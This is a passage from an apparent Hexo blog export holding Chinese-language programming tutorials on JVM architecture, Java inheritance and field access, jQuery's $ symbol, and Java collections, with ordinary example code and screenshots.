<h3 id="配置二（以-文件夹-形式发布项目）"><a href="#配置二（以-文件夹-形式发布项目）" class="headerlink" title="配置二（以 文件夹 形式发布项目）"></a>配置二（以 文件夹 形式发布项目）</h3><h4 id="图②-①"><a href="#图②-①" class="headerlink" title="图②-①"></a>图②-①</h4><p><img src="https://i.loli.net/2021/11/08/mvXNL2Fg4jTKzb8.png" alt="image-20211108154924253"></p>
<h4 id="图②-②"><a href="#图②-②" class="headerlink" title="图②-②"></a>图②-②</h4><p><img src="https://i.loli.net/2021/11/08/OSiVbPDKIxmsZhe.png" alt="image-20211108155159897"></p>
<h3 id="效果-2"><a href="#效果-2" class="headerlink" title="效果"></a>效果</h3><h4 id="图②-③"><a href="#图②-③" class="headerlink" title="图②-③"></a>图②-③</h4><p><img src="https://i.loli.net/2021/11/08/gRiIG1xnmU3OJtr.png" alt="image-20211108155353757"></p>
]]></content>
      <tags>
        <tag>Idea使用教程</tag>
        <tag>项目结构</tag>
        <tag>Tomcat</tag>
        <tag>项目打包</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA中UDP和TCP协议的简单使用流程</title>
    <url>/2021/08/31/JAVA%E4%B8%ADUDP%E5%92%8CTCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="JAVA中UDP和TCP协议的简单使用"><a href="#JAVA中UDP和TCP协议的简单使用" class="headerlink" title="JAVA中UDP和TCP协议的简单使用"></a>JAVA中UDP和TCP协议的简单使用</h2><span id="more"></span>

<p><img src="https://i.loli.net/2021/08/31/zVGoNJrIRnCtUDB.png" alt="image-20210831120154422"></p>
<p><img src="https://i.loli.net/2021/08/31/eSj6trpk78V9IaT.png" alt="image-20210831120308018"></p>
<p><img src="https://i.loli.net/2021/08/31/DzV4XUWLlkpCf82.png" alt="image-20210831120224998"></p>
]]></content>
      <tags>
        <tag>TCP</tag>
        <tag>Socket</tag>
        <tag>UDP</tag>
        <tag>DatagramSocket</tag>
        <tag>DatagramPacket</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM的位置和体系结构</title>
    <url>/2021/10/23/JVM%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="JAV体系结构"><a href="#JAV体系结构" class="headerlink" title="JAV体系结构"></a>JAV体系结构</h2><span id="more"></span>

<p><img src="https://i.loli.net/2021/10/23/q6Imytf9WSnYVl3.png" alt="image-20211023132927213"></p>
<h3 id="上图中名次解释"><a href="#上图中名次解释" class="headerlink" title="上图中名次解释"></a>上图中名次解释</h3><ul>
<li><p><strong>Class File：</strong>java文件通过<code>javac </code>执行类似<code>javac  Hello.java</code> 的命令，将java文件编译成class文件</p>
</li>
<li><p><strong>类加载器：</strong>将一些类加载到内存中的方法区中，</p>
</li>
<li><p><strong>方法区：</strong>在jdk1.8之前叫方法区,1.8之后修改成方法区,不同点在于,方法区属于堆空间一部分,是有默认大小的,元空间利用的是宿主机的内存,是动态扩展的；<strong>主要存放了一些常量、静态变量、类信息等，可以理解成class文件在内存中的存放位置。</strong></p>
</li>
<li><p><strong>栈：</strong>JVM执行java代码使用的栈</p>
</li>
<li><p><strong>本地方法栈：</strong>JVM调用操作系统方法使用的栈</p>
</li>
<li><p><strong>堆：</strong>是JVM执行java代码使用的堆；<strong>主要存放new出来的对象</strong></p>
</li>
<li><p><strong>程序计数器：</strong>是JVM执行程序的流水线，存放一些跳转指令    </p>
</li>
</ul>
<h2 id="new-类名（）底层做了什么？"><a href="#new-类名（）底层做了什么？" class="headerlink" title="new 类名（）底层做了什么？"></a>new 类名（）底层做了什么？</h2><p>可以简单的分为以下几个步骤：</p>
<ol>
<li>检查方法区中，有无该类模板——&gt;</li>
<li>生成一个对象，存储在堆中——&gt;</li>
<li>如果有对象的引用变量，则在栈中生成该引用变量，并将该引用变量指向堆中对应的对象</li>
</ol>
<p>具体看另一篇博客：<a href="https://liu-ruyang.github.io/2021/10/23/new%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%BA%95%E5%B1%82%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BA%8B%E6%83%85/">new一个对象，底层做了哪些事情 | 代码流畅，心情舒畅！ (liu-ruyang.github.io)</a></p>
]]></content>
      <tags>
        <tag>JVM</tag>
        <tag>JVM体系结构</tag>
        <tag>内存分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中有关子类访问父类成员</title>
    <url>/2021/10/19/Java%E4%B8%AD%E6%9C%89%E5%85%B3%E5%AD%90%E7%B1%BB%E8%AE%BF%E9%97%AE%E7%88%B6%E7%B1%BB%E6%88%90%E5%91%98/</url>
    <content><![CDATA[<h2 id="Java寻找属性的顺序过程"><a href="#Java寻找属性的顺序过程" class="headerlink" title="Java寻找属性的顺序过程"></a>Java寻找属性的顺序过程</h2><span id="more"></span>

<h3 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h3><p>在new一个子类对象的时候，首先会先new一个父类对象，然后将子类新增的属性套在父类对象外面</p>
<p><img src="https://i.loli.net/2021/10/19/X1m4TYgUWq7ye2I.png" alt="image-20211019125340987"></p>
<h3 id="获取属性途径"><a href="#获取属性途径" class="headerlink" title="获取属性途径"></a>获取属性途径</h3><p><strong>①通过属性名直接获取</strong></p>
<p>会从最外层向里逐层寻找，直至找到属性结束、或者遇到private终止</p>
<p><strong>②通过方法获取对象的方法</strong></p>
<p>本文讨论的是第②种，通过方法获取属性的情况</p>
<h2 id="关于父类私有属性的访问"><a href="#关于父类私有属性的访问" class="headerlink" title="关于父类私有属性的访问"></a>关于父类私有属性的访问</h2><p>在java中，子类是可以继承父类的私有属性的，但是<strong>不可以直接访问</strong>（需要通过方法或者super.父类方法）</p>
<p><strong>此时，需要分两种情况考虑：</strong></p>
<h3 id="父类的操作成员属性的方法没有被重写："><a href="#父类的操作成员属性的方法没有被重写：" class="headerlink" title="父类的操作成员属性的方法没有被重写："></a>父类的操作成员属性的方法<strong>没有被重写：</strong></h3><p>没有被重写时，可以直接通过子类调用继承自父类的public属性的方法，获取到父类的私有属性</p>
<p><img src="https://i.loli.net/2021/10/19/LsFHEeiXRpjVJnw.png" alt="image-20211019124501145"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//没有重写父类的方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出zhangsan</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="父类操作成员属性的方法被重写："><a href="#父类操作成员属性的方法被重写：" class="headerlink" title="父类操作成员属性的方法被重写："></a>父类操作成员属性的方法<strong>被重写：</strong></h3><p><img src="https://i.loli.net/2021/10/19/zWZbfQEn27V9TI3.png" alt="image-20211019124630193"></p>
<h4 id="情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，"><a href="#情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，" class="headerlink" title="情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，"></a>情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//重写父类的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getName();			<span class="comment">//重写方法后，要想调用父类的属性，就需要使用super关键字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出zhangsan</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性"><a href="#情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性" class="headerlink" title="情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性"></a>情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性</h4><p>使用this关键字，调用的是套在父类外面的属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;		<span class="comment">//使用this关键字，就需要有这个name属性存在</span></span><br><span class="line">    <span class="comment">//没有重写父类的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;		<span class="comment">//使用this关键字，调用的是套在父类外面的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);				<span class="comment">//这里是给父类中的属性进行了赋值</span></span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不论是private修饰父类的属性，还是public修饰父类的属性，都需要先看一下父类的方法有没有被子类重写；如果重写，则需要看使用的是this关键字，还是super关键字，this获取和操作父类外面的属性，super获取和操作父类里面的属性。如果没有被重写，调用的方法都是父类的public修饰的方法，因此也就是对父类的属性获取和操作。</p>
<p><img src="https://i.loli.net/2021/10/19/vATgMbuqNPnro4Z.png" alt="image-20211019131731555"></p>
]]></content>
      <tags>
        <tag>对象创建</tag>
        <tag>访问对象属性</tag>
        <tag>访问父类私有属性</tag>
        <tag>super作用</tag>
        <tag>this作用</tag>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery框架中的“美元符号”的作用</title>
    <url>/2021/10/21/Jquery%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84%E2%80%9C%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7%E2%80%9D%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<h2 id="在普通JavaScript中"><a href="#在普通JavaScript中" class="headerlink" title="在普通JavaScript中"></a>在普通JavaScript中</h2><span id="more"></span>

<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>如果不是在框架中，美元符号单纯的只是一个符号，和普通的一个字母的功能没有区别。</p>
<p>我们可以在<a href="https://www.w3school.com.cn/js/js_variables.asp">JavaScript 变量 (w3school.com.cn)</a>网站上看到这样的定义：</p>
<p><img src="https://i.loli.net/2021/10/21/5cORTM2PJDo4hGd.png" alt="image-20211021191943315"></p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>在浏览器的控制台中验证上面想法</p>
<p><img src="https://i.loli.net/2021/10/21/KfEG3QPWX9Zy7k5.png" alt="image-20211021192158058"></p>
<h2 id="在jQuery框架中"><a href="#在jQuery框架中" class="headerlink" title="在jQuery框架中"></a>在jQuery框架中</h2><p>在jQuery中，美元符号被赋予了其他的功能</p>
<h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p>首先，得明白一个道理：**在jQuery中，符号“$”的作用 就是 ”jQuery“的一个别称 **</p>
<p>所以，在jQuery中，**$的作用就是jQuery的作用**</p>
<h3 id="作用一：选择器"><a href="#作用一：选择器" class="headerlink" title="作用一：选择器"></a>作用一：选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(selector)</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">jQuery(selector)</span><br></pre></td></tr></table></figure>

<h4 id="①jQuery-元素选择器"><a href="#①jQuery-元素选择器" class="headerlink" title="①jQuery 元素选择器"></a>①jQuery 元素选择器</h4><p><strong>jQuery 使用 CSS 选择器来选取 HTML 元素。</strong></p>
<p><code>$(&quot;p&quot;)</code>                选取 &lt;p&gt; 元素。</p>
<p><code>$(&quot;p.intro&quot;)</code>   选取所有 class=”intro” 的 &lt;p&gt; 元素。</p>
<p><code>$(&quot;p#demo&quot;)</code>     选取所有 id=”demo” 的 &lt;p&gt; 元素。</p>
<h4 id="②jQuery-属性选择器"><a href="#②jQuery-属性选择器" class="headerlink" title="②jQuery 属性选择器"></a>②jQuery 属性选择器</h4><p><strong>jQuery 使用 XPath 表达式来选择带有给定属性的元素。</strong></p>
<p><code>$(&quot;[href]&quot;)</code>                 选取所有带有 href 属性的元素。</p>
<p><code>$(&quot;[href=&#39;#&#39;]&quot;)</code>         选取所有带有 href 值等于 “#” 的元素。</p>
<p><code>$(&quot;[href!=&#39;#&#39;]&quot;)</code>       选取所有带有 href 值不等于 “#” 的元素。</p>
<p><code>$(&quot;[href$=&#39;.jpg&#39;]&quot;)</code> 选取所有 href 值以 “.jpg” 结尾的元素。</p>
<h4 id="③jQuery-CSS-选择器"><a href="#③jQuery-CSS-选择器" class="headerlink" title="③jQuery CSS 选择器"></a>③jQuery CSS 选择器</h4><p><strong>jQuery CSS 选择器可用于改变 HTML 元素的 CSS 属性。</strong></p>
<p>下面的例子把所有 p 元素的背景颜色更改为红色：</p>
<p><code>$(&quot;p&quot;).css(&quot;background-color&quot;,&quot;red&quot;);</code></p>
<h3 id="作用二：功能函数前缀"><a href="#作用二：功能函数前缀" class="headerlink" title="作用二：功能函数前缀"></a>作用二：功能函数前缀</h3><p>jQuery 中有一些自带的功能函数，例如<strong>trim()：用于清理字符串前后空格。</strong>引入了jQuery 框架后，就可以按如下方式<strong>调用</strong>这些函数<strong>（注意是直接调用了）</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.trim(sString);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上代码相当于：</span></span><br><span class="line"></span><br><span class="line">jQuery.trim(sString);</span><br></pre></td></tr></table></figure>

<h3 id="作用三：解决window-onload函数的冲突"><a href="#作用三：解决window-onload函数的冲突" class="headerlink" title="作用三：解决window.onload函数的冲突"></a>作用三：解决window.onload函数的冲突</h3><h4 id="window-onload-的作用"><a href="#window-onload-的作用" class="headerlink" title="window.onload()的作用"></a>window.onload()的作用</h4><p><strong>window.onload()<strong>： 方法用于在</strong>网页加载完毕后立刻执行</strong>的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
<p><strong>①只有一个要执行的函数</strong>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.onload &#x3D; funcRef;</span><br></pre></td></tr></table></figure>

<p>在页面加载完成后 funcRef 方法会被调用。</p>
<p><strong>②有多个要执行的函数</strong>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.onload&#x3D;function()&#123;</span><br><span class="line">    Func1();</span><br><span class="line">    Func2();</span><br><span class="line">    Func3();</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在页面加载完成后依次执行 Func1、Func2、Func3。</p>
<h4 id="导致问题"><a href="#导致问题" class="headerlink" title="导致问题"></a>导致问题</h4><p>由于页面的HMTL框架需要在页面完全加载之后才能使用，因此在DOM编程时window.onload函数</p>
<p>频繁被使用。倘若页面中有多处都需要使用该函数，或者其他.js文件中也包含window.onload函数，</p>
<p>冲突问题十分棘手</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>jQuery中的ready()方法很好的解决了上述问题，它能够自动将其中的函数在页面加载完成后运行，</p>
<p>并且同一个页面中可以使用多个ready()方法，而且不互相冲突。例如</p>
<p><img src="https://i.loli.net/2021/10/21/kxSVXyHEuABRID1.png" alt="image-20211021195043967"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;table.datalist tr:nth-child(odd)&quot;</span>).addClass(<span class="string">&quot;altrow&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对于上述代码jQuery还提供了简写，可以省略其中的&quot;(document).ready&quot;部分，代码如下：</span></span><br><span class="line"></span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;table.datalist tr:nth-child(odd)&quot;</span>).addClass(<span class="string">&quot;altrow&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="作用四：创建DOM元素"><a href="#作用四：创建DOM元素" class="headerlink" title="作用四：创建DOM元素"></a>作用四：创建DOM元素</h3><p>利用DOM方法创建元素节点，通常需要将document.createElement_x()、document.create TextNode()、ppendChild()配合使用，十分麻烦，</p>
<p>而jQuery中使用”$”符号可以直接创建DOM元素。</p>
<p>例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oNewP = $(<span class="string">&quot;这是一个好故事&lt;/&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以上代码等同于javascript中的如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oNewP = <span class="built_in">document</span>.createElement_x(<span class="string">&quot;p&quot;</span>);<span class="comment">// 新建节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oText = <span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个好故事&quot;</span>);</span><br><span class="line"></span><br><span class="line">oNewP.appendChild(oText);</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>①在普通JavaScript中，美元符号作用等同于普通字母</p>
<p>②在jQuery框架中，美元符号作用有四个：</p>
<ul>
<li>选择器</li>
<li>功能函数前缀</li>
<li>解决window.onload()函数的冲突</li>
<li>创建DOM元素</li>
</ul>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery框架</tag>
        <tag>$符号</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合全集</title>
    <url>/2024/05/20/Java%E9%9B%86%E5%90%88%E5%85%A8%E9%9B%86/</url>
    <content><![CDATA[<h2 id="Java集合概述"><a href="#Java集合概述" class="headerlink" title="Java集合概述"></a>Java集合概述</h2><span id="more"></span>

<p>在Java中，集合主要包括以下四种：</p>
<ul>
<li>Collection</li>
<li>List</li>
<li>Set</li>
<li>Iterator</li>
<li>Map</li>
</ul>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240520165648.png" alt="image-20240520165641490"></p>
<p>虽然List、Set是Collection的子接口，但是这里分开讲</p>
<p>Map、和Collection属于同一级别</p>
<h3 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h3><ol>
<li>动态对象数组，区别于数组的是可以对象的内容可以任意扩充</li>
<li>特点：性能高；容易扩展和修改</li>
<li>Collection常用子类：List、Set、Queue</li>
</ol>
<h3 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h3><ol>
<li><p>可以存放任意的数据</p>
</li>
<li><p>数据<strong>可以重复</strong></p>
</li>
<li><p>List常用子类：ArrayList、Vector</p>
</li>
<li><p>常用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;		<span class="comment">// 判断集合是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span></span>;	<span class="comment">// 查找指定的对象是否存在（遍历方式查找）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将nums数组转换为list</span></span><br><span class="line">List&lt;Integer&gt; list = Arrays.stream(nums).boxed().toList();	</span><br><span class="line">List&lt;Integer&gt; list = Arrays.stream(nums).boxed().collect(Collectors.toList());</span><br><span class="line"><span class="comment">// 在Java 16及更高版本中，Stream.toList()返回的是一个不可修改的列表</span></span><br><span class="line"><span class="comment">// 因此在尝试对其排序时会出现错误。可以改用Collectors.toList()来创建一个可修改的列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// list转换为数组</span></span><br><span class="line">list</span><br><span class="line">    .stream().sorted()	<span class="comment">// 排序，返回的是Stream&lt;T&gt;</span></span><br><span class="line">    .toList().toArray(numbers);	<span class="comment">// 转换为数组，需要先转换为List（stream也有toList方法，不转换为list，会报错）</span></span><br><span class="line"><span class="comment">// lambda写法</span></span><br><span class="line">Integer[] numbers = list.stream().sorted().toArray(Integer[]::<span class="keyword">new</span>);		<span class="comment">// 写法①：流直接转换为数组</span></span><br><span class="line">Integer[] numbers =  list.stream().sorted().toList().toArray(Integer[]::<span class="keyword">new</span>);	<span class="comment">// 写法②：流先转换为list，再转换为数组</span></span><br></pre></td></tr></table></figure></li>
<li><p>比较<strong>Vector</strong></p>
<table>
<thead>
<tr>
<th>比较</th>
<th>Array List</th>
<th>Vector</th>
</tr>
</thead>
<tbody><tr>
<td>推出时间</td>
<td>JDK1.2之后推出</td>
<td>JDK1.0</td>
</tr>
<tr>
<td>性能</td>
<td>采用异步处理方式，性能高</td>
<td>采用同步处理方式，性能低</td>
</tr>
<tr>
<td>线程安全</td>
<td>属于非线程安全</td>
<td>属于线程安全</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h3><ol>
<li><p><strong>不能</strong>加入重复元素</p>
</li>
<li><p><strong>可以排序</strong>（本身不支持排序，它是基于哈希表实现的，不保证元素的顺序。但是，可以将 <code>HashSet</code> 的元素转移到一个排序的列表或集合中，如 <code>TreeSet</code>，<code>TreeSet</code> 自动对元素进行排序（<strong>红黑树</strong>算法），因为它实现了 <code>SortedSet</code> 接口。）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    HashSet&lt;Integer&gt; hashSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    hashSet.add(<span class="number">3</span>);</span><br><span class="line">    hashSet.add(<span class="number">1</span>);</span><br><span class="line">    hashSet.add(<span class="number">4</span>);</span><br><span class="line">    hashSet.add(<span class="number">2</span>);</span><br><span class="line">    hashSet.add(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 HashSet 元素添加到 TreeSet 中，自动排序</span></span><br><span class="line">    TreeSet&lt;Integer&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;(hashSet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印排序后的元素</span></span><br><span class="line">    <span class="keyword">for</span> (Integer number : treeSet) &#123;</span><br><span class="line">        System.out.println(number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>常用子类：HashSet、TreeSet</p>
</li>
<li><p>与list转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">set.stream().collect(Collectors.toList());		<span class="comment">// 借助流，转换为List类型</span></span><br><span class="line"><span class="keyword">new</span> ArrayList&lt;&gt;(itemIds)			<span class="comment">// 效果等同</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Iterator接口"><a href="#Iterator接口" class="headerlink" title="Iterator接口"></a>Iterator接口</h3><ol>
<li><p>集合输出的标准操作：标准操作，使用Iterator接口</p>
</li>
<li><p>操作原理：Iterator是专门的迭代输出接口，迭代输出就是将元素一个个进行判断，判断其是否有内容，如果有内容则把内容取出</p>
</li>
<li><p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;		<span class="comment">// 如果仍有元素可以迭代，则返回true</span></span><br><span class="line"><span class="function">E <span class="title">next</span><span class="params">()</span></span>;				<span class="comment">// 返回迭代的下一个元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;			<span class="comment">// 从迭代器指向的collection中移除迭代器返回的最后一个元素</span></span><br></pre></td></tr></table></figure></li>
<li><p>案例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    list.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    list.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    list.add(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">    list.add(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">    list.add(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    list.add(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">    </span><br><span 